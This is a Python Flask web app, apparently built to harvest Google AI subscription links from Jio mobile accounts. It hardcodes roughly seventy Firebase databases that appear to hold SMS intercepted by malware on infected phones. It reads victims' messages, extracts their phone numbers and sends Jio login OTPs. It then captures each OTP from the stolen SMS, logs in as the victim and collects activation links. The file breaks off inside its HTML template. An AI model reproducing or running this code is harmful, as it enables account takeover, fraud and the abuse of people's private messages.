"""
Jio Gemini Activation Scanner - WEB EDITION
Single-file Flask app for Render deployment.
"""

from __future__ import annotations
import csv
import html
import io
import json
import re
import threading
import time
import uuid
from collections import Counter, defaultdict
from datetime import datetime
from queue import Queue, Empty
from typing import Any
from urllib.parse import unquote
from zoneinfo import ZoneInfo

import requests
from flask import Flask, Response, jsonify, render_template_string, request

# ==================== PANELS ====================

FIREBASE_PANELS = [
    ("https://cep10hui-default-rtdb.firebaseio.com", "https://cep10hui-default-rtdb.firebaseio.com"),
    ("https://tinobiggan-default-rtdb.firebaseio.com", "https://tinobiggan-default-rtdb.firebaseio.com"),
    ("https://atifgndu-default-rtdb.firebaseio.com", "https://atifgndu-default-rtdb.firebaseio.com"),
    ("https://jsisbeuve-default-rtdb.firebaseio.com", "https://jsisbeuve-default-rtdb.firebaseio.com"),
    ("https://fir-27c9e-default-rtdb.firebaseio.com", "AizAsyA7EOpeZLDxPAYcS2_nb1J2ZKr4TNCgp6Q"),
    ("https://rupesh-6c5e5-default-rtdb.firebaseio.com", "AizAsyAFML11FrkfFMx0c4hOYqaCKUNVj5f8XhA"),
    ("https://desi-742d2-default-rtdb.firebaseio.com", "https://desi-742d2-default-rtdb.firebaseio.com"),
    ("https://santosh-8-default-rtdb.firebaseio.com", "https://santosh-8-default-rtdb.firebaseio.com"),
    ("https://yqhw2-fb47-default-rtdb.firebaseio.com", "AizAsyAdvY2CkMHoY3Ww_ah6b0pFdNKNTHKZnypUY"),
    ("https://ikka-83d65-default-rtdb.firebaseio.com", "https://ikka-83d65-default-rtdb.firebaseio.com"),
    ("https://master-panel-6bcfc-default-rtdb.firebaseio.com", "https://master-panel-6bcfc-default-rtdb.firebaseio.com"),
    ("https://landelle-20855-default-rtdb.firebaseio.com", "https://landelle-20855-default-rtdb.firebaseio.com"),
    ("https://autobot7-214ee-default-rtdb.firebaseio.com", "https://autobot7-214ee-default-rtdb.firebaseio.com"),
    ("https://shilpa-e712a-default-rtdb.firebaseio.com", "https://shilpa-e712a-default-rtdb.firebaseio.com"),
    ("https://dath-da88a-default-rtdb.firebaseio.com", "https://dath-da88a-default-rtdb.firebaseio.com"),
    ("https://apkdir-default-rtdb.firebaseio.com", "https://apkdir-default-rtdb.firebaseio.com"),
    ("https://apkpure-6eb6a-default-rtdb.firebaseio.com", "https://apkpure-6eb6a-default-rtdb.firebaseio.com"),
    ("https://hdjdjdj-a73f2-default-rtdb.firebaseio.com", "https://hdjdjdj-a73f2-default-rtdb.firebaseio.com"),
    ("https://yogeshbhaitumchuitya-default-rtdb.firebaseio.com", "https://yogeshbhaitumchuitya-default-rtdb.firebaseio.com"),
    ("https://anvith6-9450e-default-rtdb.firebaseio.com", "https://anvith6-9450e-default-rtdb.firebaseio.com"),
    ("https://jayma-9ce22-default-rtdb.firebaseio.com", "https://jayma-9ce22-default-rtdb.firebaseio.com"),
    ("https://konaio-default-rtdb.firebaseio.com", "https://konaio-default-rtdb.firebaseio.com"),
    ("https://kitter-34345-default-rtdb.firebaseio.com", "https://kitter-34345-default-rtdb.firebaseio.com"),
    ("https://apkdir-f6fb9-default-rtdb.firebaseio.com", "https://apkdir-f6fb9-default-rtdb.firebaseio.com"),
    ("https://vibe-d238e-default-rtdb.firebaseio.com", "https://vibe-d238e-default-rtdb.firebaseio.com"),
    ("https://alienware-c11b0-default-rtdb.firebaseio.com", "https://alienware-c11b0-default-rtdb.firebaseio.com"),
    ("https://csforme-dc64a-default-rtdb.firebaseio.com", "AizAsyCEk7GmmKKwJSCAjCDIxOa8AISQZyxy6bw"),
    ("https://max-a-cbe29-default-rtdb.firebaseio.com", "AizAsyCQeygjNYLwmbf_ZC86gvRye7XBI-BIBawq"),
    ("https://raaz-5287d-default-rtdb.firebaseio.com", "Hebdixnd"),
    ("https://singhaan-6f199-default-rtdb.firebaseio.com", "AizAsyD-1Gvt2cmr0mv1x0K4V9vtjVMXyJVLAv"),
    ("https://painislv-default-rtdb.firebaseio.com", "AizAsyCqnjDPgVCaE36q7N4HbdfUEB9FbluM8pDs"),
    ("https://risho-d4c66-default-rtdb.firebaseio.com", "AizAsyBkccFcNJ-FfClxHMzrRAyropULYvexsW0"),
    ("https://runjun-master-panel-default-rtdb.firebaseio.com", "AizAsyBawSxrOxhTZk7C2V0-LkcoyEs7n6y4msw"),
    ("https://tinmn88-b7db5-default-rtdb.firebaseio.com", "AizAsyBDanswTNTm4-E7v4wCX-_WsQ0A8ZaDIf"),
    ("https://e14turnament2-default-rtdb.firebaseio.com", "AizAsyBIJawvyJ8SHeZ14iLesyx4bAOr8EPGt"),
    ("https://newspreding-default-rtdb.firebaseio.com", "AizAsyDsWt99EDO-HdTmG3U9tARSElpki13JWFo"),
    ("https://bossbun-default-rtdb.firebaseio.com", "AizAsyBfqObM5HnK6khogyF4ytOX7E9N0e_lAQ"),
    ("https://jpicku-47790-default-rtdb.firebaseio.com", "https://jpicku-47790-default-rtdb.firebaseio.com"),
    ("https://shivalmpanel-eb3b7-default-rtdb.firebaseio.com", "https://shivalmpanel-eb3b7-default-rtdb.firebaseio.com"),
    ("https://annu-f0207-default-rtdb.firebaseio.com", "https://annu-f0207-default-rtdb.firebaseio.com"),
    ("https://strange-2e4aa-default-rtdb.firebaseio.com", "https://strange-2e4aa-default-rtdb.firebaseio.com"),
    ("https://customer-support-5-default-rtdb.firebaseio.com", "https://customer-support-5-default-rtdb.firebaseio.com"),
    ("https://gandhi-ji-1-default-rtdb.asia-southeast1.firebaseio.com", "https://gandhi-ji-1-default-rtdb.asia-southeast1.firebaseio.com"),
    ("https://muajob-29c86-default-rtdb.firebaseio.com", "https://muajob-29c86-default-rtdb.firebaseio.com"),
    ("https://totala-panel-default-rtdb.firebaseio.com", "https://totala-panel-default-rtdb.firebaseio.com"),
    ("https://kingu-2dbb9-default-rtdb.firebaseio.com", "https://kingu-2dbb9-default-rtdb.firebaseio.com"),
    ("https://rajabhaya-default-rtdb.firebaseio.com", "https://rajabhaya-default-rtdb.firebaseio.com"),
    ("https://heisenberg-8c3da-default-rtdb.firebaseio.com", "https://heisenberg-8c3da-default-rtdb.firebaseio.com"),
    ("https://customer-support-12e40-default-rtdb.firebaseio.com", "https://customer-support-12e40-default-rtdb.firebaseio.com"),
    ("https://sada-bcbcd-default-rtdb.firebaseio.com", "https://sada-bcbcd-default-rtdb.firebaseio.com"),
    ("https://bharat56-b6ee1-default-rtdb.firebaseio.com", "https://bharat56-b6ee1-default-rtdb.firebaseio.com"),
    ("https://phone55-d7d89-default-rtdb.firebaseio.com", "https://phone55-d7d89-default-rtdb.firebaseio.com"),
    ("https://e9turnament1-default-rtdb.firebaseio.com", "https://e9turnament1-default-rtdb.firebaseio.com"),
    ("https://colana-84ce2-default-rtdb.firebaseio.com", "https://colana-84ce2-default-rtdb.firebaseio.com"),
    ("https://hospital-14-default-rtdb.firebaseio.com", "https://hospital-14-default-rtdb.firebaseio.com"),
    ("https://vdgsh-623ed-default-rtdb.firebaseio.com", "https://vdgsh-623ed-default-rtdb.firebaseio.com"),
    ("https://arvind-c5b03-default-rtdb.firebaseio.com", "https://arvind-c5b03-default-rtdb.firebaseio.com"),
    ("https://axisjames-default-rtdb.firebaseio.com", "https://axisjames-default-rtdb.firebaseio.com"),
    ("https://mafiaaaa2oppp-default-rtdb.firebaseio.com", "AizAsyBl3179G60c2LzYPrbkp4tmuRKK_7H0_0g"),
    ("https://niggasionic-default-rtdb.asia-southeast1.firebasedatabase.app", "https://niggasionic-default-rtdb.asia-southeast1.firebasedatabase.app"),
    ("https://krijhjuiiccyy-default-rtdb.firebaseio.com", "https://krijhjuiiccyy-default-rtdb.firebaseio.com"),
    ("https://youbabu-default-rtdb.firebaseio.com", "https://youbabu-default-rtdb.firebaseio.com"),
    ("https://kali-1b217-default-rtdb.firebaseio.com", "https://kali-1b217-default-rtdb.firebaseio.com"),
    ("https://sallu-9934f-default-rtdb.firebaseio.com", "https://sallu-9934f-default-rtdb.firebaseio.com"),
    ("https://chinky-d92ab-default-rtdb.firebaseio.com", "https://chinky-d92ab-default-rtdb.firebaseio.com"),
    ("https://loddysingh-6d511-default-rtdb.firebaseio.com", "https://loddysingh-6d511-default-rtdb.firebaseio.com"),
    ("https://simadevi-f42fc-default-rtdb.firebaseio.com", "https://simadevi-f42fc-default-rtdb.firebaseio.com"),
    ("https://olamigo-41620-default-rtdb.firebaseio.com", "https://olamigo-41620-default-rtdb.firebaseio.com"),
    ("https://anup-f900e-default-rtdb.firebaseio.com", "https://anup-f900e-default-rtdb.firebaseio.com"),
    ("https://bishnu-a0e01-default-rtdb.firebaseio.com", "https://bishnu-a0e01-default-rtdb.firebaseio.com"),
    ("https://akmbro-be675-default-rtdb.asia-southeast1.firebasedatabase.app", "https://akmbro-be675-default-rtdb.asia-southeast1.firebasedatabase.app"),
    ("https://hdhdusgsvshshshs-default-rtdb.firebaseio.com", "https://hdhdusgsvshshshs-default-rtdb.firebaseio.com"),
    ("https://sastaapp-394cd-default-rtdb.firebaseio.com", "https://sastaapp-394cd-default-rtdb.firebaseio.com"),
]

# ==================== CONSTANTS ====================

MESSAGE_SCAN_LIMIT = 100
OTP_TIMEOUT = 15
POLL_INTERVAL = 1

CHECK_NUMBER_URL = "https://www.jio.com/api/jio-recharge-service/recharge/mobility/number/{mobile}"
SEND_OTP_URL = "https://www.jio.com/api/jio-login-service/login/sendOtp"
VERIFY_OTP_URL = "https://www.jio.com/api/jio-login-service/login/validateOtp"
AUTH_URL = "https://www.jio.com/api/jio-authenticate-service/authenticate/authJsonData"
NAVIGATE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/navigate/Z0241"
ACTIVATE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/activate/Z0241?source=JIO"
GOOGLE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/google-ai"
SUBMIT_URL = "https://www.jio.com/api/jio-ott-service/ott/submission/submit"
GOOGLE_PAGE = "https://www.jio.com/selfcare/googleai/?header=no&type=Z0241&source=JIO"

NUMBER_PATTERNS = (
    re.compile(r"(?i)\bjio\s*(?:number|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
    re.compile(r"(?i)\brecharge(?:\s+now)?\s+jio\s+no[.]?\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
    re.compile(r"(?i)\bairtel\s*(?:number|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
    re.compile(r"(?i)\bphone\s*(?:number|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
)

OTP_WORD_PATTERN = re.compile(r"(?i)\botp\b|one[ -]?time password|verification|code")
OTP_PATTERN = re.compile(r"(?<!\d)(\d{6})(?!\d)")

ACTIVATION_PATTERN = re.compile(
    r"https?://serviceactivation[.]google[.]com/subscription/new/"
    r"(?P<token>[A-Za-z0-9_-]{50,})(?P<padding>={0,2})",
    re.IGNORECASE,
)

# ==================== JOB MANAGER ====================

class Job:
    def __init__(self, job_id: str):
        self.id = job_id
        self.status = "idle"          # idle | running | done | error | stopped
        self.phase = "waiting"        # waiting | scanning_panels | extracting_numbers | activating | finished
        self.log: list[dict[str, Any]] = []
        self.queue: Queue = Queue()
        self.stop_flag = threading.Event()
        self.thread: threading.Thread | None = None
        self.started_at: float | None = None
        self.ended_at: float | None = None
        self.lock = threading.Lock()

        # counters / results
        self.panel_total = len(FIREBASE_PANELS)
        self.panel_done = 0
        self.online_devices: dict[str, dict[str, Any]] = {}
        self.targets: list[dict[str, Any]] = []
        self.target_done = 0
        self.statuses: Counter = Counter()
        self.links: list[str] = []
        self.results: list[dict[str, Any]] = []
        self.error_msg: str = ""

    # ---------- SSE / event emission ----------
    def emit(self, event: str, data: dict[str, Any]) -> None:
        payload = {"event": event, "data": data, "ts": time.time()}
        with self.lock:
            self.log.append(payload)
            if len(self.log) > 500:
                self.log = self.log[-500:]
        self.queue.put(payload)

    # ---------- snapshot for /status ----------
    def snapshot(self) -> dict[str, Any]:
        elapsed = 0
        if self.started_at:
            end = self.ended_at or time.time()
            elapsed = round(end - self.started_at, 1)
        return {
            "id": self.id,
            "status": self.status,
            "phase": self.phase,
            "panel_total": self.panel_total,
            "panel_done": self.panel_done,
            "online_count": len(self.online_devices),
            "target_total": len(self.targets),
            "target_done": self.target_done,
            "statuses": dict(self.statuses),
            "links": self.links,
            "results": self.results,
            "elapsed": elapsed,
            "error": self.error_msg,
        }


JOBS: dict[str, Job] = {}
JOBS_LOCK = threading.Lock()


def get_job(job_id: str) -> Job | None:
    with JOBS_LOCK:
        return JOBS.get(job_id)


def create_job() -> Job:
    job_id = uuid.uuid4().hex[:12]
    job = Job(job_id)
    with JOBS_LOCK:
        JOBS[job_id] = job
    return job


# ==================== HELPERS ====================

def firebase_session() -> requests.Session:
    s = requests.Session()
    s.headers.update({"Accept": "application/json", "Cache-Control": "no-cache"})
    return s


def jio_session() -> requests.Session:
    s = requests.Session()
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": "https://www.jio.com",
        "Referer": "https://www.jio.com/selfcare/login/",
    })
    return s


def response_json(r: requests.Response) -> dict[str, Any]:
    try:
        data = r.json()
    except ValueError:
        return {}
    return data if isinstance(data, dict) else {}


def response_error(r: requests.Response) -> bool:
    if not r.ok:
        return True
    data = response_json(r)
    if data.get("errorMessage") or data.get("error"):
        return True
    return str(data.get("status", "")).lower() in {"failed", "failure", "error", "false"}


def normalize_mobile(value: Any) -> str | None:
    digits = re.sub(r"\D", "", str(value or ""))
    if len(digits) > 10 and digits.startswith("91"):
        digits = digits[-10:]
    return digits if re.fullmatch(r"[6-9]\d{9}", digits) else None


def firebase_get(session: requests.Session, base_url: str, key: str, path: str, params: dict[str, Any] | None = None) -> Any:
    query = {"auth": key}
    if params:
        query.update(params)
    if key and key.startswith("http"):
        r = session.get(f"{base_url}/{path.strip('/')}.json", timeout=15)
        r.raise_for_status()
        return r.json()
    r = session.get(f"{base_url}/{path.strip('/')}.json", params=query, timeout=15)
    r.raise_for_status()
    return r.json()


def latest_messages(session: requests.Session, base_url: str, key: str, device_id: str, limit: int) -> dict[str, dict[str, Any]]:
    data = firebase_get(session, base_url, key, f"messages/{device_id}", {"orderBy": '"$key"', "limitToLast": max(1, limit)})
    if not isinstance(data, dict):
        return {}
    return {k: v for k, v in data.items() if isinstance(v, dict)}


def number_candidates(messages: dict[str, dict[str, Any]]) -> set[str]:
    found: set[str] = set()
    for item in messages.values():
        sim_info = item.get("simInfo")
        if isinstance(sim_info, dict):
            mobile = normalize_mobile(sim_info.get("phoneNumber"))
            if mobile:
                found.add(mobile)
        mobile = normalize_mobile(item.get("phoneNumber"))
        if mobile:
            found.add(mobile)
        body = str(item.get("message", ""))
        for pattern in NUMBER_PATTERNS:
            found.update(pattern.findall(body))
    return found


def is_jio_number(session: requests.Session, mobile: str) -> bool:
    try:
        r = session.get(CHECK_NUMBER_URL.format(mobile=mobile), timeout=15)
    except requests.RequestException:
        return False
    data = response_json(r)
    return not response_error(r) and bool(data.get("primaryService"))


def send_otp(session: requests.Session, mobile: str) -> bool:
    try:
        r = session.post(
            SEND_OTP_URL,
            json={"mobileNumber": mobile, "loginFlowType": "MOBILE", "alternateNumber": ""},
            timeout=15,
        )
    except requests.RequestException:
        return False
    return not response_error(r)


def verify_otp(session: requests.Session, mobile: str, otp: str) -> bool:
    try:
        r = session.post(VERIFY_OTP_URL, json={"mobileNumber": mobile, "otp": otp}, timeout=15)
    except requests.RequestException:
        return False
    return not response_error(r)


def message_order(key: str, item: dict[str, Any]) -> int:
    for value in (item.get("id"), item.get("timestamp"), key):
        try:
            return int(value)
        except (TypeError, ValueError):
            continue
    return 0


def wait_for_otp(firebase, base_url, key, device_id, known_keys, jio, mobile, stop_flag: threading.Event) -> bool:
    used: set[str] = set()
    deadline = time.monotonic() + OTP_TIMEOUT
    while time.monotonic() < deadline and not stop_flag.is_set():
        try:
            messages = latest_messages(firebase, base_url, key, device_id, 20)
        except requests.RequestException:
            time.sleep(POLL_INTERVAL)
            continue
        candidates = []
        for message_key, item in messages.items():
            if message_key in known_keys or message_key in used:
                continue
            body = str(item.get("message", ""))
            if not OTP_WORD_PATTERN.search(body):
                continue
            match = OTP_PATTERN.search(body)
            if match:
                candidates.append((message_order(message_key, item), message_key, match.group(1)))
        if candidates:
            _, message_key, otp = max(candidates)
            used.add(message_key)
            if verify_otp(jio, mobile, otp):
                return True
        time.sleep(POLL_INTERVAL)
    return False


def activation_url(value: str) -> str:
    text = html.unescape(value or "")
    for _ in range(4):
        decoded = unquote(text)
        if decoded == text:
            break
        text = decoded
    match = ACTIVATION_PATTERN.search(text)
    if not match:
        return ""
    return "https://serviceactivation.google.com/subscription/new/" + match.group("token") + match.group("padding")


def already_active(value: str) -> bool:
    normalized = " ".join((value or "").lower().replace("_", " ").split())
    return any(p in normalized for p in (
        "already active", "already activated", "already redeemed",
        "already claimed", "already availed"
    ))


def api_message(data: dict[str, Any]) -> str:
    for name in ("errorMessage", "responseMessage", "responseMsg", "message"):
        if data.get(name):
            return str(data[name])
    return ""


def get_activation(session: requests.Session) -> tuple[str, str]:
    dash_headers = {"Accept": "*/*", "Referer": "https://www.jio.com/selfcare/dashboard/"}
    offer_headers = {"Accept": "*/*", "Referer": GOOGLE_PAGE}
    try:
        auth_r = session.get(AUTH_URL, headers=dash_headers, timeout=15)
        auth_d = response_json(auth_r)
        if not auth_r.ok or str(auth_d.get("loginFlag", "")).lower() != "true":
            return "api_session_invalid", ""
        session.get(NAVIGATE_URL, headers=dash_headers, timeout=15)
        activate_r = session.get(ACTIVATE_URL, headers=offer_headers, timeout=15)
        activate_d = response_json(activate_r)
        if already_active(api_message(activate_d)):
            return "already_active", ""
        if not activate_r.ok or str(activate_d.get("errorCode", "200")) != "200":
            return "activation_api_failed", ""
        google_r = session.get(GOOGLE_URL, headers=offer_headers, timeout=15)
        google_d = response_json(google_r)
        if already_active(api_message(google_d)):
            return "already_active", ""
        url = activation_url(str(google_d.get("redirectionURL", "")))
        if not url:
            return "no_activation_url", ""
        try:
            session.get(SUBMIT_URL, headers=offer_headers, timeout=15)
        except requests.RequestException:
            pass
        return "activation_url_found", url
    except requests.RequestException:
        return "activation_api_failed", ""


# ==================== WORKER ====================

def run_scan(job: Job) -> None:
    try:
        job.started_at = time.time()
        job.status = "running"
        job.emit("phase", {"phase": "scanning_panels", "total": job.panel_total})

        # -------- Phase 1: scan panels --------
        for idx, (base_url, key) in enumerate(FIREBASE_PANELS, start=1):
            if job.stop_flag.is_set():
                job.status = "stopped"
                job.emit("log", {"level": "warn", "msg": "Stopped by user"})
                break

            fb = firebase_session()
            online_count = 0
            panel_status = "ok"
            try:
                if key and key.startswith("http"):
                    r = fb.get(f"{base_url}/clients.json", timeout=10)
                else:
                    r = fb.get(f"{base_url}/clients.json?auth={key}", timeout=10)

                if r.status_code == 200:
                    clients = r.json()
                    if isinstance(clients, dict):
                        for device_id, data in clients.items():
                            if isinstance(data, dict) and data.get("status") is True:
                                job.online_devices[device_id] = {
                                    "base_url": base_url,
                                    "firebase_key": key,
                                    "firebase_session": fb,
                                    "data": data,
                                }
                                online_count += 1
                    else:
                        panel_status = "no_clients"
                else:
                    panel_status = f"http_{r.status_code}"
            except Exception as e:
                panel_status = "error"
                job.emit("log", {"level": "error", "msg": f"Panel {idx}: {e}"})

            job.panel_done = idx
            job.emit("panel", {
                "idx": idx,
                "total": job.panel_total,
                "url": base_url,
                "online": online_count,
                "status": panel_status,
                "online_total": len(job.online_devices),
            })

        if job.stop_flag.is_set():
            job.ended_at = time.time()
            job.phase = "finished"
            job.emit("done", job.snapshot())
            return

        # -------- Phase 2: extract numbers --------
        job.phase = "extracting_numbers"
        job.emit("phase", {"phase": "extracting_numbers", "total": len(job.online_devices)})

        mappings: dict[str, set[str]] = defaultdict(set)
        device_messages: dict[str, dict[str, dict[str, Any]]] = {}

        devices_list = list(job.online_devices.items())
        for i, (device_id, info) in enumerate(devices_list, start=1):
            if job.stop_flag.is_set():
                break
            try:
                messages = latest_messages(
                    info["firebase_session"],
                    info["base_url"],
                    info["firebase_key"],
                    device_id,
                    MESSAGE_SCAN_LIMIT,
                )
                device_messages[device_id] = messages
                for mobile in number_candidates(messages):
                    mappings[mobile].add(device_id)
            except Exception:
                device_messages[device_id] = {}

            if i % 5 == 0 or i == len(devices_list):
                job.emit("extract", {"done": i, "total": len(devices_list), "numbers": len(mappings)})

        job.targets = []
        for mobile, devices in sorted(mappings.items()):
            if devices:
                job.targets.append({"device_id": sorted(devices)[0], "mobile": mobile})

        job.emit("phase", {"phase": "activating", "total": len(job.targets)})

        if job.stop_flag.is_set():
            job.ended_at = time.time()
            job.phase = "finished"
            job.status = "stopped"
            job.emit("done", job.snapshot())
            return

        # -------- Phase 3: OTP + activation --------
        job.phase = "activating"
        for serial, target in enumerate(job.targets, start=1):
            if job.stop_flag.is_set():
                job.status = "stopped"
                break

            device_id = target["device_id"]
            mobile = target["mobile"]
            info = job.online_devices.get(device_id)
            if not info:
                continue

            base_url = info["base_url"]
            key = info["firebase_key"]
            fb = info["firebase_session"]
            device = info["data"]

            if not isinstance(device, dict) or device.get("status") is not True:
                status, url = "device_offline", ""
            else:
                jio = jio_session()
                if not is_jio_number(jio, mobile):
                    status, url = "not_jio_number", ""
                else:
                    known_keys = set(device_messages.get(device_id, {}))
                    if not send_otp(jio, mobile):
                        status, url = "otp_send_failed", ""
                    elif not wait_for_otp(fb, base_url, key, device_id, known_keys, jio, mobile, job.stop_flag):
                        status, url = "otp_failed", ""
                    else:
                        status, url = get_activation(jio)

            job.statuses[status] += 1
            job.target_done = serial

            nepal_now = datetime.now(ZoneInfo("Asia/Kathmandu"))
            result_row = {
                "serial": serial,
                "device_id": device_id,
                "mobile": mobile,
                "status": status,
                "activation_url": url,
                "nepal_date": nepal_now.strftime("%Y-%m-%d"),
                "nepal_time": nepal_now.strftime("%I:%M:%S %p"),
            }
            job.results.append(result_row)
            if url:
                job.links.append(url)

            job.emit("target", {
                "serial": serial,
                "total": len(job.targets),
                "device_id": device_id,
                "mobile": mobile,
                "status": status,
                "url": url,
            })

        job.status = "done" if not job.stop_flag.is_set() else "stopped"
        job.phase = "finished"
        job.ended_at = time.time()
        job.emit("done", job.snapshot())

    except Exception as e:
        job.status = "error"
        job.error_msg = str(e)
        job.phase = "finished"
        job.ended_at = time.time()
        job.emit("error", {"msg": str(e)})
        job.emit("done", job.snapshot())


# ==================== FLASK APP ====================

app = Flask(__name__)


INDEX_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Jio Gemini Scanner</title>
<style>
  :root{
    --bg:#0a0c10;
    --panel:#11151c;
    --panel2:#161b24;
    --border:#232a36;
    --text:#e6edf3;
    --muted:#7d8794;
    --accent:#5eead4;
    --accent2:#38bdf8;
    --warn:#fbbf24;
    --err:#f87171;
    --ok:#4ade80;
    --mono:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
  }
  *{box-sizing:border-box}
  html,body{margin:0;padding:0;background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;font-size:14px}
  a{color:var(--accent2);text-decoration:none}
  a:hover{text-decoration:underline}
  .wrap{max-width:1240px;margin:0 auto;padding:24px 20px 80px}
  header{display:flex;align-items:center;justify-content:space-between;gap:16px;margin-bottom:24px;flex-wrap:wrap}
  h1{font-size:20px;margin:0;letter-spacing:-0.01em}
  h1 span{color:var(--accent)}
  .sub{color:var(--muted);font-size:12px;margin-top:4px}
  .controls{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
  button{
    background:var(--panel2);color:var(--text);border:1px solid var(--border);
    padding:9px 16px;border-radius:8px;font-size:13px;cursor:pointer;font-family:inherit;
    transition:all .15s ease;
  }
  button:hover:not(:disabled){border-color:var(--accent);color:var(--accent)}
  button:disabled{opacity:.45;cursor:not-allowed}
  button.primary{background:var(--accent);color:#06231e;border-color:var(--accent);font-weight:600}
  button.primary:hover:not(:disabled){background:#7cf2dd;color:#06231e}
  button.danger{border-color:#5a2222;color:var(--err)}
  button.danger:hover:not(:disabled){border-color:var(--err);background:#2a1212}

  .grid{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:12px;margin-bottom:20px}
  .stat{background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:14px 16px}
  .stat .lbl{color:var(--muted);font-size:11px;text-transform:uppercase;letter-spacing:.08em}
  .stat .val{font-size:22px;font-weight:600;margin-top:6px;font-family:var(--mono)}
  .stat .val.accent{color:var(--accent)}
  .stat .val.ok{color:var(--ok)}
  .stat .val.warn{color:var(--warn)}

  .progress{height:6px;background:var(--panel2);border-radius:99px;overflow:hidden;margin-bottom:20px}
  .progress > div{height:100%;background:linear-gradient(90deg,var(--accent),var(--accent2));width:0;transition:width .3s ease}

  .cols{display:grid;grid-template-columns:1.1fr 1fr;gap:16px}
  @media(max-width:900px){.cols{grid-template-columns:1fr}.grid{grid-template-columns:repeat(2,1fr)}}

  .card{background:var(--panel);border:1px solid var(--border);border-radius:10px;overflow:hidden;display:flex;flex-direction:column;min-height:380px}
  .card-head{padding:12px 16px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;background:var(--panel2)}
  .card-head h2{font-size:13px;margin:0;text-transform:uppercase;letter-spacing:.08em;color:var(--muted);font-weight:600}
  .card-body{flex:1;overflow:auto;padding:12px 16px;font-family:var(--mono);font-size:12px;line-height:1.55}
  .card-body::-webkit-scrollbar{width:8px}
  .card-body::-webkit-scrollbar-thumb{background:var(--border);border-radius:4px}

  .log-line{display:flex;gap:8px;padding:2px 0;border-bottom:1px dotted rgba(255,255,255,.03)}
  .log-line .t{color:var(--muted);flex-shrink:0}
  .log-line.ok .msg{color:var(--ok)}
  .log-line.err .msg{color:var(--err)}
  .log-line.warn .msg{color:var(--warn)}
  .log-line.info .msg{color:var(--accent2)}

  table{width:100%;border-collapse:collapse;font-family:var(--mono);font-size:11.5px}
  th,td{text-align:left;padding:7px 8px;border-bottom:1px solid var(--border)}
  th{color:var(--muted);font-weight:600;text-transform:uppercase;font-size:10px;letter-spacing:.06em;background:var(--panel2);position:sticky;top:0}
  td.num{color:var(--accent)}
  td.status-ok{color:var(--ok)}
  td.status-err{color:var(--err)}
  td.status-warn{color:var(--warn)}
  tr:hover{background:rgba(94,234,212,.04)}

  .empty{color:var(--muted);text-align:center;padding:40px 0;font-style:italic}
  .pill{display:inline-block;padding:2px 8px;border-radius:99px;font-size:10px;background:var(--panel2);border:1px solid var(--border);color:var(--muted);text-transform:uppercase;letter-spacing:.05em}
  .pill.run{color:var(--accent);border-color:var(--accent)}
  .pill.done{color:var(--ok);border-color:var(--ok)}
  .pill.err{color:var(--err);border-color:var(--err)}
  .pill.stop{color:var(--warn);border-color:var(--warn)}

  .dllink{display:inline-block;margin-left:8px;font-size:11px;color:var(--accent);border:1px solid var(--border);padding:3px 8px;border-radius:6px}
  .dllink:hover{border-color:var(--accent)}
</style>
</head>
<body>
<div class="wrap">
  <header>
    <div>
      <h1>Jio <span>Gemini</span> Scanner</h1>
      <div class="sub">Firebase panel scan → number extraction → OTP activation</div>
    </div>
    <div class="controls">
      <span id="statePill" class="pill">idle</span>
      <button id="startBtn" class="primary">Start Scan</button>
      <button id="stopBtn" class="danger" disabled>Stop</button>
      <a id="dlLinks" class="dllink" style="display:none" href="#">links.txt</a>
      <a id="dlResults" class="dllink" style="display:none" href="#">results.csv</a>
    </div>
  </header>

  <div class="grid">
    <div class="stat"><div class="lbl">Panels</div><div class="val" id="sPanel">0 / 0</div></div>
    <div class="stat"><div class="lbl">Online Devices</div><div class="val accent" id="sDevices">0</div></div>
    <div class="stat"><div class="lbl">Numbers Queued</div><div class="val" id="sNumbers">0</div></div>
    <div class="stat"><div class="lbl">Activation Links</div><div class="val ok" id="sLinks">0</div></div>
  </div>

  <div class="progress"><div id="progBar"></div></div>

  <div class="cols">
    <div class="card">
      <div class="card-head"><h2>Live Log</h2><span class="pill" id="elapsed">0s</span></div>
      <div class="card-body" id="logBox"><div class="empty">waiting to start…</div></div>
    </div>
    <div class="card">
      <div class="card-head"><h2>Results</h2><span class="pill" id="resCount">0</span></div>
      <div class="card-body" id="resBox" style="padding:0"><div class="empty">no results yet</div></div>
    </div>
  </div>
</div>

<script>
(function(){
  const $ = id => document.getElementById(id);
  let jobId = null;
  let es = null;
  let t0 = 0;
  let tick = null;

  const statusClass = s => {
    if (!s) return "";
    if (["activation_url_found","already_active"].includes(s)) return "status-ok";
    if (s.startsWith("otp") || s === "device_offline" || s === "not_jio_number") return "status-warn";
    if (s.endsWith("failed") || s.endsWith("invalid")) return "status-err";
    return "";
  };

  function logLine(kind, msg) {
    const box = $("logBox");
    if (box.querySelector(".empty")) box.innerHTML = "";
    const now = new Date().toLocaleTimeString();
    const div = document.createElement("div");
    div.className = "log-line " + kind;
    div.innerHTML = `<span class="t">${now}</span><span class="msg"></span>`;
    div.querySelector(".msg").textContent = msg;
    box.appendChild(div);
    box.scrollTop = box.scrollHeight;
  }

  function addResult(row) {
    const box = $("resBox");
    if (box.querySelector(".empty")) box.innerHTML = "";
    let table = box.querySelector("table");
    if (!table) {
      table = document.createElement("table");
      table.innerHTML = `<thead><tr><th>#</th><th>Number</th><th>Status</th><th>Link</th></tr></thead><tbody></tbody>`;
      box.appendChild(table);
    }
    const tb = table.querySelector("tbody");
    const tr = document.createElement("tr");
    tr.innerHTML = `
